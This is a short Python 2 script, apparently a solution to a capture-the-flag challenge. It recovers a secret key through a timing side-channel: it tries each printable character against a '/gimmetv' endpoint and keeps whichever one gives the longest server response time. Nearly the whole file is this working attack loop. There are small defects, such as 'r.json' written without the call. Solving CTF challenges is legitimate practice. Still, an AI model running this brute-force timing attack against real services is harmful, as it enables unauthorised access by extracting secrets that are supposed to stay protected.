import requests
import string
import sys
#url="https://ctf.fluxfingers.net:1316"
url="http://127.0.0.1:8085"
headers={
#    "User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
#    "User-Agent": "WallE"
    "Content-Type":"application/x-www-form-urlencoded"
}
content={
        "ccn":"1234567812345678",
        "ccv":"123",
        "ed":"11/11/2014",
        "amount":"1234567890.00",
        "email":"b722192@drdrb.com"
        }
content={
        "debug":""    
        }
#r=requests.get(url+"/vault", headers=headers)
st=""
success=False
dis=string.printable[:-5]

while not success:
    tmpMax=""
    max_inter=0
    for i in dis:
        tmpSt=st+i
        content["key"]=tmpSt
        r=requests.post(url+"/gimmetv",headers=headers, data=content)
        resp = r.json
        if resp["success"]==True:
            success=True
            break
        inter = resp["end"]-resp["start"]
#        print "testing %s interval %f" %(i, inter)
        if inter > max_inter:
            tmpMax=i
            max_inter=inter
    print "chosen letter %s" %(repr(tmpMax))
    st+=tmpMax
    print "temp string is %s" %(repr(st))
print "ans %s" %(repr(tmpSt))
print resp
